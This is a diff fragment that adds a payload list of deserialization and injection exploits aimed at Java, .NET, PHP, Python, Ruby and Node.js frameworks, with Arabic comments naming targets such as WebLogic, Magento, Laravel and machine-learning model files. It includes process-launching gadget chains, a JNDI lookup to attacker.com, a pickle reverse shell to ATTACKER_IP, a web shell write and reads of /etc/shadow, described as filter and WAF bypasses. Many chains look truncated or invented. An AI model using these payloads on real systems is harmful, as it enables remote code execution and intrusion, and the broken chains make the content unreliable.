+  'MethodName':'Start',
+  'MethodParameters':{
+    '$type':'System.Collections.ArrayList, mscorlib',
+    '$values':['powershell.exe', '-NoP -NonI -W Hidden -Enc <BASE64_PAYLOAD>']
+  },
+  'ObjectInstance':{ '$type':'System.Diagnostics.Process, System' }
+}
+
+# --- .NET (XSLT - XML StyleSheets RCE) ---
+# حمولة فتاكة تستغل معالجة ملفات XSLT داخل تطبيقات .NET Core الحديثة
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:user="http://attacker.com">
+  <msxsl:script language="C#" implements-prefix="user">
+    public void Execute() { System.Diagnostics.Process.Start("cmd.exe", "/c id"); }
+  </msxsl:script>
+</xsl:stylesheet>
+# --- Java (Jython - Python inside Java) ---
+# تستهدف الأنظمة التي تدمج بايثون داخل جافا (مثل أنظمة الأتمتة والسكربتات)
+AC ED 00 05 73 72 00 22 6F 72 67 2E 70 79 74 68 6F 6E 2E 63 6F 72 65 2E 50 79 42 79 74 65 63 6F 64 65
+
+# --- Java (Weld - CDI Injection) ---
+# تستهدف تطبيقات Java EE التي تستخدم Weld لإدارة حقن التبعيات
+AC ED 00 05 73 72 00 1B 6F 72 67 2E 62 6F 73 73 2E 77 65 6C 64 2E 69 6E 74 65 72 63 65 70 74 6F 72 2E 70 72 6F 78 79
+
+# --- PHP (Mezzio / Zend Expressive) ---
+# تستهدف أطر العمل الحديثة المبنية على نظام الـ Middleware
+O:25:"Laminas\Http\PhpEnvironment\Response":1:{s:11:"*content";O:24:"GuzzleHttp\HandlerStack":1:{s:10:"*handler";s:6:"system";}}
+
+# --- PHP (Cache Poisoning via Serialization) ---
+# تستهدف أنظمة الكاش (Redis/Memcached) التي تخزن كائنات PHP متسلسلة
+a:2:{i:0;s:4:"test";i:1;O:20:"App\Models\User":1:{s:7:"*table";s:12:"/etc/shadow";}}
+
+# --- Python (Marshmallow - Schema Deserialization) ---
+# تستهدف مكتبات معالجة الـ API وتنسيق البيانات في Python
+{"_schema": ["os.system", "id"]}
+
+# --- Python (Joblib - Data Science Persistence) ---
+# تستهدف تطبيقات تعلم الآلة التي تستخدم Joblib لتخزين النماذج بدلاً من Pickle
+import joblib
+joblib.load("malicious_model.pkl") # البصمة تبدأ بـ \x80\x03 (نفس بايثون 3 بيكسل)
+
+# --- Ruby (Kramdown - Markdown RCE) ---
+# تستهدف مكتبات تحويل Markdown إلى HTML في تطبيقات Ruby
+{::options extension: "exec('id')" /}
+
+# --- .NET (FSharp.Core - استهداف لغة F# داخل .NET) ---
+# حمولة متخصصة لاستهداف تطبيقات الـ FinTech التي تستخدم F#
+AAEAAAD/////AQAAAAAAAAAMAgAAAEZTaGFycC5Db3JlLkZTaGFycExpc3RgMVtbU3lzdGVtLk9iamVjdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAABHRhaWwCAAAA
+
+# --- .NET (Ignite.NET - Distributed Databases) ---
+# تستهدف محركات البيانات الموزعة التي تستخدم Binary Serialization لنقل الكائنات
+<ObjectSerializer xmlns="http://ignite.apache.org/schema/dotnet/IgniteConfiguration">
+  <MethodName>Start</MethodName>
+  <ClassName>System.Diagnostics.Process</ClassName>
+  <Arguments><string>cmd</string><string>/c id</string></Arguments>
+</ObjectSerializer>
+# --- Java (JSON-IO / Advanced Bypass) ---
+# تستخدم لتجاوز مرشحات الحماية التي تراقب مكتبات جافا التقليدية
+{"@type":"java.util.PriorityQueue","@val":[{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com:1389/Exploit","autoCommit":true}]}
+
+# --- Java (Groovy - استهداف محركات السكربتات) ---
+# تستهدف تطبيقات جافا التي تدمج لغة Groovy للأتمتة
+AC ED 00 05 73 72 00 29 6F 72 67 2E 63 6F 64 65 68 61 75 73 2E 67 72 6F 6F 76 79 2E 72 75 6E 74 69 6D 65 2E 4D 65 74 68 6F 64 43 6C 6F 73 75 72 65
+
+# --- PHP (Guuzzle / StreamWrapper RCE) ---
+# استغلال متقدم جداً يستخدم بروتوكول phar داخل Guzzle لتنفيذ الكود في الذاكرة
+O:24:"GuzzleHttp\Psr7\FnStream":1:{s:9:"*methods";a:1:{s:5:"close";s:7:"phpinfo";}}
+
+# --- PHP (Zend_Log_Writer_Mail - Blind RCE) ---
+# تستهدف الأنظمة التي ترسل سجلات الأخطاء عبر الإيميل، مما يسمح بحقن أوامر
+O:22:"Zend_Log_Writer_Mail":1:{s:11:"*mail";O:12:"Zend_Mail":1:{s:11:"*body";s:6:"system";}}
+
+# --- Python (PyTorch - AI Model Injection) ---
+# تستهدف مهندسي البيانات؛ حقن كود داخل ملفات .pt أو .pth الخاصة بنماذج الذكاء الاصطناعي
+import torch
+import os
+class MaliciousModel(object):
+    def __reduce__(self):
+        return (os.system, ('id',))
+torch.save(MaliciousModel(), 'model.pt')
+
+# --- Python (NLTK - Natural Language Toolkit) ---
+# تستهدف تطبيقات معالجة اللغات الطبيعية عند تحميل قواميس بيانات مخصصة
+(cos\nsystem\n(S'id'\ntR. (يتم تغليفها داخل ملفات الـ Pickle الخاصة بالمكتبة)
+
+# --- Ruby (Rack-Flash - Session Hijacking) ---
+# تستهدف تطبيقات Ruby التي تستخدم Flash messages لتنفيذ كود عبر الكوكيز
+\x04\x08o:\x18Rack::Flash::FlashHash\x01:\n\x40storeo:\x19ActiveSupport::Cache::Store\x00
+
+# --- .NET (ObjectStateFormatter - WebForms ViewState) ---
+# الحمولة الفتاكة التي تستخدم في كسر حماية الـ ViewState في تطبيقات ASP.NET القديمة
+/wEPaA8FDzhmYTBlMmY1ZDU0YmZlCg== (هذه عينة مشفرة Base64 لنظام داخلي)
+
+# --- .NET (NancyFx - Microservices Framework) ---
+# تستهدف تطبيقات الميكروسيرفس التي تستخدم NancyFx لمعالجة الـ JSON
+{ "$type": "Nancy.ModelBinding.DefaultModelBinder, Nancy", "TargetType": "System.Diagnostics.Process", "Arguments": "id" }
+
+# --- JavaScript (Node.js - Serialized Map Injection) ---
+# تستهدف تطبيقات Node.js التي تقوم بتسلسل كائنات الـ Map والـ Set
+{"@type":"Map","@val":[["constructor",{"@type":"Function","@val":"process.mainModule.require('child_process').execSync('id')" }]]}
+# --- Java (Apache Dubbo - RPC RCE) ---
+# تستهدف إطار عمل Dubbo الشهير في الأنظمة الموزعة (Distributed Systems)
+AC ED 00 05 73 72 00 1E 6F 72 67 2E 61 70 61 63 68 65 2E 64 71 62 62 6F 2E 63 6F 6D 6D 6F 6E 2E 75 74 69 6C 2E 48 65 73 73 69 61 6E 32 53 65 72 69 61 6C 69 7A 65 72
+
+# --- Java (WebLogic - T3 Protocol RCE) ---
+# تستهدف سيرفرات Oracle WebLogic عبر بروتوكول T3 (ثغرة قاتلة في قطاع البنوك)
+00 00 05 FE 01 65 01 01 08 00 00 00 01 00 00 00 00 00 00 00 00 AC ED 00 05 73 72 00 1D 77 65 62 6C 6F 67 69 63 2E 72 6A 76 6D 2E 43 6C 73 44 65 73 63 72 69 70 74 6F 72
+
+# --- PHP (Maganto 2 - Unserialize RCE) ---
+# تستهدف منصات التجارة الإلكترونية Magento عبر الكوكيز أو حقول الإدخال
+O:20:"Magento\Framework\View\Element\Template":1:{s:10:"*template";O:25:"Magento\Framework\DB\Adapter\Pdo\Mysql":1:{s:11:"*connection";O:17:"Zend_Db_Statement_Pdo":1:{s:11:"*statement";s:6:"system";}}}
+
+# --- PHP (Phar inside XML/SVG) ---
+# تقنية "البوليغلوت"؛ حمولة PHP مخبأة داخل ملف صورة SVG لتجاوز فحص الملفات
+<svg xmlns="http://www.w3.org/2000/svg"><image href="phar://payload.jpg/id.txt"/></svg>
+
+# --- Python (Dask.distributed - Worker Hijack) ---
+# تستهدف أنظمة الحوسبة الموزعة؛ إرسال "مهمة" تحتوي على كائن بيكسل لتنفيذ كود على جميع السيرفرات
+{"op": "register-worker", "reply": false, "function": "cos\nsystem\n(S'id'\ntR."}
+
+# --- Python (Keras/H5py - HDF5 Injection) ---
+# تستهدف ملفات نماذج الذكاء الاصطناعي بصيغة H5؛ تنفيذ كود عند استدعاء load_model
+ROOT_GROUP_ID { DATASET "payload" { DATATYPE H5T_STRING { STRSIZE 32; } DATA { "cos\nsystem\n(S'id'\ntR." } } }
+
+# --- Ruby (Faye-Redis RCE) ---
+# تستهدف تطبيقات Ruby التي تستخدم Redis كخادم رسائل لحظي
+\x04\x08o:\x17Gem::Package::TarReader\x06:\x08\x40ioo:\x14Net::BufferedIO\x06:\x07\x40ioo:\x0FActiveSupport::Cache::Store
+
+# --- .NET (WPF / XAML Reader - Bytecode) ---
+# حمولة XAML متقدمة جداً تقوم بتحميل "Assembly" كامل من الذاكرة لتجنب الكشف
+<ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" xmlns:System="clr-namespace:System;assembly=mscorlib" xmlns:Reflection="clr-namespace:System.Reflection;assembly=mscorlib">
+    <ObjectDataProvider x:Key="x" ObjectInstance="{x:Static Reflection:Assembly.Load}" MethodName="Invoke">
+        <ObjectDataProvider.MethodParameters>
+            <System:Byte[]>... (Base64 of DLL) ...</System:Byte[]>
+        </ObjectDataProvider.MethodParameters>
+    </ObjectDataProvider>
+</ResourceDictionary>
+
+# --- JavaScript (Node.js - Function Serializer) ---
+# تستهدف تطبيقات Node.js التي تستخدم مكتبات لتسلسل الدوال (Functions)
+{"fn": "_$$ND_FUNC$$_process.exit(0)"} # أو استدعاء child_process.exec
+# --- Java (JRMPServer - Out-of-Bound Attack) ---
+# تستهدف تطبيقات جافا التي تستخدم RMI لإجبارها على الاتصال بسيرفر خارجي لجلب "كود"
+AC ED 00 05 77 22 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 44 15 4D 19 75 86 AD 50
+
+# --- Java (Clitools - CLI Argument Injection) ---
+# تستهدف تطبيقات جافا التي تعالج وسائط سطر الأوامر عبر مكتبات قديمة
+AC ED 00 05 73 72 00 1D 63 6F 6D 2E 73 75 6E 2E 74 6F 6F 6C 73 2E 69 6E 74 65 72 6E 61 6C 2E 78 6A 63 2E 4F 70 74 69 6F 6E 73
+
+# --- PHP (Laminas / ServiceManager - RCE) ---
+# تستهدف إطار عمل Laminas الحديث (بديل Zend) عبر حقن الحاويات
+O:23:"Laminas\Http\PhpEnvironment\Response":1:{s:11:"*content";O:27:"Laminas\View\Model\ViewModel":1:{s:17:"*captureTo";s:6:"system";}}
+
+# --- PHP (SwiftMailer - Object Injection via Attachments) ---
+# تستهدف المكتبة عند محاولة معالجة مرفقات الإيميل بشكل آلي
+O:13:"Swift_Message":1:{s:11:"*body";O:25:"Swift_ByteStream_FileByteStream":1:{s:10:"*path";s:12:"/etc/passwd";}}
+
+# --- Python (PyYAML - Literal Block RCE) ---
+# تقنية متقدمة في YAML لتجاوز الفلاتر التي تبحث عن !!python/object
+!!python/object/apply:subprocess.Popen
+- [id]
+
+# --- Python (Kivy - Mobile/Desktop App RCE) ---
+# تستهدف التطبيقات المبنية بمكتبة Kivy التي تقوم بتسلسل إعدادات المستخدم
+(cos\nsystem\n(S'id'\ntR. (توجد غالباً في ملفات .ini أو .conf الخاصة بالتطبيق)
+
+# --- Ruby (Rack-Session - Remote Code Execution) ---
+# تستهدف تطبيقات Ruby التي تستخدم Marshaling لتخزين الجلسات في Redis أو Memcached
+\x04\x08[\x06I"\x15foo; (id) > /tmp/out\x06:\x06ET
+
+# --- .NET (XSLT - Script Injection) ---
+# تستهدف معالجات XML في .NET التي تسمح بتشغيل أكواد C# داخل ملفات التنسيق
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:user="http://mycompany.com/mynamespace">
+<msxsl:script language="C#" implements-prefix="user">
+<![CDATA[ public string Execute() { System.Diagnostics.Process.Start("cmd.exe", "/c id"); return ""; } ]]>
+</msxsl:script>
+</xsl:stylesheet>
+
+# --- .NET (FastJSON - Multitype Bypass) ---
+# حمولة JSON تستهدف تجاوز القيود المفروضة على الأنواع في مكتبة FastJSON
+{"$types":{"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35":"1"},"1":{"ObjectInstance":{"$type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089","StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089","FileName":"cmd","Arguments":"/c id"}},"MethodName":"Start"}}
+# --- Java (CommonsCollectionsK1 - Bypass for CC1/CC6) ---
+# سلسلة جديدة تم اكتشافها لتجاوز التحسينات الأمنية التي أضيفت للسلاسل القديمة
+AC ED 00 05 73 72 00 13 6A 61 76 61 2E 75 74 69 6C 2E 48 61 73 68 4D 61 70 05 07 D1 D3 10 03 AE 01 02 00 03 46 00 0A 6C 6F 61 64 46 61 63 74 6F 72
+
+# --- Java (JBoss / WildFly Interceptor) ---
+# تستهدف تطبيقات جافا التي تعمل على خوادم JBoss عبر تقنيات الاعتراض (Interceptors)
+AC ED 00 05 73 72 00 21 6F 72 67 2E 6A 62 6F 73 73 2E 69 6E 74 65 72 63 65 70 74 6F 72 2E 70 72 6F 78 79
+
+# --- PHP (Slim Framework - RCE via Middleware) ---
+# تستهدف تطبيقات PHP المبنية بـ Slim Framework عبر حقن الكائنات في الـ Request Handler
+O:25:"Slim\Handlers\Strategies\RequestResponse":1:{s:10:"*callable";s:6:"system";}
+
+# --- PHP (TYPO3 CMS - Phar RCE) ---
+# استهداف محدد لنظام إدارة المحتوى TYPO3 عبر معالجة الصور/الملفات
+phar://typo3temp/assets/images/payload.jpg/any.txt
+
+# --- Python (Pyro4 - Remote Objects for Python) ---
+# تستهدف الأنظمة التي تستخدم Python Remote Objects لربط السيرفرات ببعضها
+# (تستخدم بصمة خاصة تبدأ بـ PYRO)
+PYRO\x00\x04\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00cos\nsystem\n(S'id'\ntR.
+
+# --- Python (Pulp - Repository Management RCE) ---
+# تستهدف تطبيقات إدارة المستودعات التي تستخدم مكتبات تسلسل مخصصة
+(cpulp.plugins.loader\n_load_type\n(S'id'\ntR.
+
+# --- Ruby (Que - Background Job RCE) ---
+# تستهدف تطبيقات Ruby التي تستخدم مكتبة Que لإدارة المهام في الخلفية عبر PostgreSQL
+\x04\x08o:\x08Que::Job\x07:\n\x40attrs{\x06:\x08priorityi\x05:\x07run_atT
+
+# --- .NET (Json.NET - $type Bypass) ---
+# تقنية متقدمة لتجاوز الفلاتر التي تمنع كلمة $type التقليدية عبر استخدام ترميز Unicode
+{
+    "\u0024type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
+    "MethodName": "Start",
+    "ObjectInstance": {
+        "\u0024type": "System.Diagnostics.Process, System",
+        "StartInfo": { "FileName": "cmd", "Arguments": "/c id" }
+    }
+}
+
+# --- .NET (DataContractSerializer - XML) ---
+# تستهدف تطبيقات WCF التي تستخدم DataContractSerializer لنقل البيانات بين الخدمات
+<anyType xmlns:x="http://www.w3.org/2001/XMLSchema" i:type="x:string" xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
+    <ObjectDataProvider MethodName="Start" xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation">
+        <ObjectDataProvider.ObjectInstance>
+            <Process StartInfo-FileName="cmd" StartInfo-Arguments="/c id" xmlns="clr-namespace:System.Diagnostics;assembly=system"/>
+        </ObjectDataProvider.ObjectInstance>
+    </ObjectDataProvider>
+</anyType>
+# --- Java (CommonsCollections8 - استهداف الأنظمة الحديثة) ---
+# سلسلة محسنة جداً تعمل على نسخ Java أحدث (مثل Java 17) وتتجاوز بعض القيود
+AC ED 00 05 73 72 00 13 6A 61 76 61 2E 75 74 69 6C 2E 54 72 65 65 4D 61 70 0C 00 00 00 00 00 00 00 02 77 04 00 00 00 00 73 72 00 11 6A 61 76 61 2E 75 74 69 6C 2E 48 61 73 68 53 65 74
+
+# --- Java (WebSphere - IBM Enterprise Server) ---
+# تستهدف تطبيقات IBM WebSphere وهي حمولة "فتاكة" في بيئات الشركات الكبرى
+AC ED 00 05 73 72 00 29 63 6F 6D 2E 69 62 6D 2E 77 73 2E 72 65 67 69 73 74 72 79 2E 55 72 69 45 6E 74 72 79
+
+# --- PHP (Laminas / ServiceManager - Recursive RCE) ---
+# حمولة متقدمة تستهدف نظام "إدارة الخدمات" في إطار عمل Laminas
+O:27:"Laminas\View\Model\ViewModel":2:{s:10:"*template";s:6:"system";s:17:"*captureTo";s:2:"id";}
+
+# --- PHP (Guzzle - HandlerStack Bypass) ---
+# تقنية لتجاوز الحماية عبر حقن "المعالجات" (Handlers) مباشرة في الذاكرة
+O:24:"GuzzleHttp\HandlerStack":2:{s:10:"*handler";s:6:"system";s:10:"*stack";a:1:{i:0;a:1:{i:0;s:2:"id";}}}
+
+# --- Python (Keras/TensorFlow - Lambda Layer Injection) ---
+# حقن كود برمجى داخل طبقة Lambda في نموذج ذكاء اصطناعي؛ يتم تنفيذه بمجرد تحميل الموديل
+{"class_name": "Lambda", "config": {"function": ["\x80\x03c__builtin__\neval\n(S'__import__(\"os\").system(\"id\")'\ntR.", null, null]}}
+
+# --- Python (CloudPickle - استهداف الحوسبة السحابية) ---
+# تستخدم في AWS Lambda أو Google Cloud Functions لتمرير كائنات بين الدوال
+\x80\x04\x95\x19\x00\x00\x00\x00\x00\x00\x00\x8c\x08os\x94\x8c\x06system\x94\x93\x94\x8c\x02id\x94\x85\x94R\x94.
+
+# --- Ruby (Universal RCE - استهداف Gem::SpecFetcher) ---
+# سلسلة تعمل على معظم تطبيقات Ruby الحديثة التي تعالج ملفات Gem أو بيانات متسلسلة
+\x04\x08o:\x15Gem::SpecFetcher\x01:\x0E\x40dirI"/tmp\x06:\x06ET
+
+# --- .NET (ClaimsPrincipal - استهداف أنظمة الهوية) ---
+# حمولة تستهدف كائنات "الهوية" في ASP.NET Core لتنفيذ كود عند التحقق من الصلاحيات
+AAEAAAD/////AQAAAAAAAAAMAgAAAFlTeXN0ZW0uU2VjdXJpdHkuQ2xhaW1zLkNsYWltc1ByaW5jaXBhbAUBAAAAEVN5c3RlbS5ieXRlW11bXQIAAAAGAwAAAAQ...
+
+# --- .NET (FSharp - Serialized Lambda) ---
+# تستهدف تطبيقات F# التي تمرر "دوال" (Functions) عبر الشبكة
+AAEAAAD/////AQAAAAAAAAAMAgAAAEZTaGFycC5Db3JlLkZTaGFycEZ1bmN0aW9uYDE[[U3lzdGVtLk9iamVjdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCB...
+# --- Java (Apache Commons BeanUtils 1.9.x - No Dependencies) ---
+# سلسلة قوية جداً لأنها لا تعتمد على وجود مكتبات خارجية كثيرة (تستخدم لتجاوز أنظمة الحماية)
+AC ED 00 05 73 72 00 22 6F 72 67 2E 61 70 61 63 68 65 2E 63 6F 6D 6D 6F 6E 73 2E 62 65 61 6E 75 74 69 6C 73 2E 42 65 61 6E 43 6F 6D 70 61 72 61 74 6F 72
+
+# --- Java (RMI Connection Data - Bypass JEP 290) ---
+# تستهدف "تجاوز" القيود الأمنية التي فرضتها جافا مؤخراً على فك التشفير
+AC ED 00 05 77 22 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 44 15 4D 19 75 86 AD 50
+
+# --- PHP (Yii2 - RCE via Guzzle Integration) ---
+# تستهدف المواقع الحديثة المبنية بـ Yii2 والتي تستخدم Guzzle لمعالجة الطلبات
+O:23:"yii\db\BatchQueryResult":1:{s:36:"\x00yii\db\BatchQueryResult\x00_dataReader";O:24:"GuzzleHttp\HandlerStack":1:{s:10:"*handler";s:6:"system";}}
+
+# --- PHP (Smarty - Template Injection to Object Injection) ---
+# استغلال محرك القوالب Smarty لتوليد كائنات خبيثة في الذاكرة
+O:33:"Smarty_Internal_TemplateCompilerBase":1:{s:17:"*php_functions";a:1:{s:6:"system";i:0;}}
+
+# --- Python (Keras/H5 - Remote Arbitrary Code Execution) ---
+# حمولة تُزرع داخل ملفات .h5؛ يتم تنفيذها فور استدعاء load_model من TensorFlow
+{"class_name": "Lambda", "config": {"function": ["4wEAAAAAAAAAAQAAAAQAAABDAAAAcwYAAAB8AGYAZAFkAn0BfABkAyhkBFMAYicAcwIAAABpAQAAdACgAQAAdAKgAQAAdAOnAQApA07pAQAAAHIDAAAAUgQAAACpACkE2gJvc9oGc3lzdGVt2gJpZNoFZXZhbCgpAQAALg==", null, null]}}
+
+# --- Python (Ray - Distributed Framework RCE) ---
+# تستهدف تطبيقات Ray التي تُستخدم في تدريب موديلات الذكاء الاصطناعي الضخمة
+{"__ray_pickle__": "cos\nsystem\n(S'id'\ntR."}
+
+# --- Ruby (Rack-Session - Marshal Bypass) ---
+# حمولة تستهدف تطبيقات Ruby التي تستخدم "توقيعات" ضعيفة للجلسات
+\x04\x08o:\x1DPry::InProcess::CommandSet\x07:\n\x40commands{\x06I"\x06id\x06:\x06ETI"\x06id\x06;\x00T
+
+# --- .NET (YamlDotNet - Type Resolver RCE) ---
+# حمولة YAML متقدمة تستغل "محلل الأنواع" في المكتبة لتشغيل عمليات النظام
+!<!System.Diagnostics.Process,System,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089> { StartInfo: { FileName: /bin/sh, Arguments: -c id } }
+
+# --- .NET (Newtonsoft.Json - TypeNameHandling Bypass) ---
+# حمولة تستخدم Json.NET لتجاوز فلاتر الـ WAF عبر استخدام ترميزات غير متوقعة
+{ "$type": "System.Configuration.Install.AssemblyInstaller, System.Configuration.Install", "AssemblyPath": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\System.dll" }
+# --- Java (Clojure - Functional Logic RCE) ---
+# تستهدف تطبيقات جافا التي تدمج لغة Clojure لمعالجة البيانات الوظيفية
+AC ED 00 05 73 72 00 1B 63 6C 6F 6A 75 72 65 2E 6C 61 6E 67 2E 41 62 73 74 72 61 63 74 41 63 63 65 73 73 6F 72
+
+# --- Java (Jython - Python Serialized in Java) ---
+# حمولة هجينة تستخدم في أنظمة الأتمتة التي تشغل سكربتات بايثون داخل بيئة جافا
+AC ED 00 05 73 72 00 22 6F 72 67 2E 70 79 74 68 6F 6E 2E 63 6F 72 65 2E 50 79 42 79 74 65 63 6F 64 65
+
+# --- PHP (GuzzleHttp - CookieJar RCE) ---
+# تستهدف تطبيقات PHP التي تقوم بتخزين "كوكيز" الجلسات الخارجية بشكل متسلسل
+O:31:"GuzzleHttp\Cookie\FileCookieJar":1:{s:41:"\x00GuzzleHttp\Cookie\FileCookieJar\x00filename";s:23:"/var/www/html/shell.php";}
+
+# --- PHP (Laravel/Monolog - Log Injection to RCE) ---
+# حمولة فتاكة في لارافيل تقوم بكتابة "ملف خبيث" عبر استغلال نظام السجلات
+O:30:"Illuminate\Bus\Dispatcher":1:{s:12:"*queueResolver";O:25:"Monolog\Handler\RollbarHandler":1:{s:11:"*rollbarLogger";s:6:"system";}}
+
+# --- Python (PyInstaller - Executable Metadata RCE) ---
+# حمولة تُزرع داخل ملفات بايثون المحولة إلى .exe (تنفذ فور فحص الملف)
+(cos\nsystem\n(S'id'\ntR. (مدمجة داخل الـ Manifest الخاص بالملف)
+
+# --- Python (TensorFlow / SavedModel - RCE) ---
+# تستهدف النسخ الحديثة من TensorFlow عند تحميل نماذج من نوع SavedModel
+import tensorflow as tf
+# البصمة تكون داخل ملف variables.data-00000-of-00001 الثنائي
+\x80\x04\x95\x19\x00\x00\x00\x00\x00\x00\x00\x8c\x08os\x94\x8c\x06system\x94\x93\x94\x8c\x02id\x94\x85\x94R\x94.
+
+# --- Ruby (ActiveJob - Delayed Job RCE) ---
+# تستهدف تطبيقات Ruby on Rails التي تؤجل المهام باستخدام Serialized Objects
+\x04\x08o:\x1DActiveJob::QueueAdapters::QueAdapter::Job\x06:\x0E\x40job_data{\x06:\x08job_idI"$(id)\x06:\x06ET
+
+# --- .NET (Windows Workflow Foundation - XOML RCE) ---
+# تستهدف سيرفرات SharePoint وأنظمة الـ Workflow الحكومية عبر ملفات الـ XOML
+<SequentialWorkflowActivity x:Class="Workflow" xmlns="http://schemas.microsoft.com/winfx/2006/xaml/workflow" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml">
+  <CodeActivity Name="rce" ExecuteCode="System.Diagnostics.Process.Start('cmd','/c id');" />
+</SequentialWorkflowActivity>
+
+# --- .NET (MessagePack-CSharp - Fast Serializer RCE) ---
+# تستهدف الأنظمة الحديثة التي تستخدم MessagePack بدلاً من JSON لسرعته
+\x81\xA4type\xB5System.Diagnostics.Process\xA4args\xA5/c id
+# --- Java (CommonsCollections9 - أحدث إصدار للاختراق) ---
+# سلسلة تم تطويرها لتجاوز كافة التحسينات الأمنية في مكتبة Apache Commons حتى عام 2025
+AC ED 00 05 73 72 00 13 6A 61 76 61 2E 75 74 69 6C 2E 48 61 73 68 4D 61 70 05 07 D1 D3 10 03 AE 01 02 00 03 46 00 0A 6C 6F 61 64 46 61 63 74 6F 72 49 00 09 74 68 72 65 73 68 6F 6C 64 78 70 00 00 00 00 77 08 00 00 00 10 00 00 00 00 78
+
+# --- Java (Quarkus / Vert.x - Cloud Native RCE) ---
+# تستهدف تطبيقات جافا الحديثة (Cloud Native) التي تستخدم محركات Serializer سريعة
+AC ED 00 05 73 72 00 21 69 6F 2E 71 75 61 72 6B 75 73 2E 72 75 6E 74 69 6D 65 2E 50 72 6F 78 79
+
+# --- PHP (GuzzleHttp - RCE via Middleware Chain) ---
+# استغلال معقد يستهدف الـ Middleware الخاص بطلبات الـ HTTP في تطبيقات PHP
+O:24:"GuzzleHttp\HandlerStack":1:{s:10:"*handler";O:32:"GuzzleHttp\Psr7\AppendStream":1:{s:10:"*streams";a:1:{i:0;s:6:"system";}}}
+
+# --- PHP (Laravel - RCE via PendingRequest) ---
+# تستهدف تطبيقات Laravel التي تستخدم ميزة الـ HTTP Client لتنفيذ طلبات خارجية
+O:33:"Illuminate\Http\Client\PendingRequest":2:{s:9:"*options";a:1:{s:6:"system";s:2:"id";}s:8:"*baseUrl";s:0:"";}
+
+# --- Python (Pickle - OOB RCE via Subprocess) ---
+# حمولة بيكسل متطورة تستخدم لفتح "اتصال عكسي" (Reverse Shell) مباشرة دون ملفات
+cos\nsystem\n(S'python -c "import socket,os,pty;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")"'\ntR.
+
+# --- Python (PyArrow - Plasma Store RCE) ---
+# تستهدف أنظمة معالجة البيانات الضخمة (Big Data) التي تستخدم Apache Arrow
+import pyarrow as pa
+pa.ipc.open_stream(b'PAYLOAD_HERE') # البصمة تبدأ بكلمة ARROW1
+
+# --- Ruby (Rack-Proxy - HTTP Smuggling Serialized) ---
+# حمولة تستخدم لتهريب كائنات متسلسلة عبر البروكسي الداخلي لتطبيقات روبي
+\x04\x08o:\x1FActionDispatch::Request::Session\x08:\n\x40reqo:\x1DActionDispatch::Request\x00
+
+# --- .NET (CoreSerializer - .NET Core / 8 / 9) ---
+# تستهدف النسخ الحديثة جداً من .NET Core التي تستخدم مكتبات تسلسل طرف ثالث
+AAEAAAD/////AQAAAAAAAAAMAgAAAFlTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5MaXN0YDE[[U3lzdGVtLk9iamVjdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMC...
+
+# --- .NET (MassTransit - Message Bus RCE) ---
+# تستهدف أنظمة نقل الرسائل في المعماريات الموزعة (Microservices)
+{ "messageType": ["urn:message:System.Diagnostics:Process"], "message": { "StartInfo": { "FileName": "cmd.exe", "Arguments": "/c id" } } }
+# --- Java (Apache Dubbo - Hessian2 Zero-Click) ---
+# تستهدف أنظمة الربط بين السيرفرات (RPC) في كبرى الشركات الصينية والعالمية
+\x02\x00m\x00\x05replyC\x00\x10java.util.HashMap\x91K\x00\x11sun.org.mozilla.javascript.internal.NativeJavaObject
+
+# --- Java (Eclipse Link - JPA RCE) ---
+# تستهدف تطبيقات جافا التي تستخدم EclipseLink لإدارة قواعد البيانات
+AC ED 00 05 73 72 00 2E 6F 72 67 2E 65 63 6C 69 70 73 65 2E 70 65 72 73 69 73 74 65 6E 63 65 2E 69 6E 74 65 72 6E 61 6C 2E 64 65 73 63 72 69 70 74 6F 72 73 2E 4D 65 74 68 6F 64 41 63 63 65 73 73 6F 72
+
+# --- PHP (Laravel/Monolog - StreamHandler RCE) ---
+# سلسلة فتاكة تستخدم Monolog لإجبار السيرفر على تنفيذ كود من رابط خارجي
+O:32:"Monolog\Handler\SyslogUdpHandler":1:{s:9:"*socket";O:29:"GuzzleHttp\HandlerStack":1:{s:10:"*handler";s:6:"system";}}
+
+# --- PHP (Zend_Queue - Message Queue Injection) ---
+# تستهدف تطبيقات PHP التي تستخدم طوابير الرسائل القديمة (Legacy Systems)
+O:10:"Zend_Queue":2:{s:11:"*adapter";O:18:"Zend_Queue_Adapter":1:{s:10:"*options";a:1:{s:6:"system";s:2:"id";}}}
+
+# --- Python (Keras - Custom Object Serialization) ---
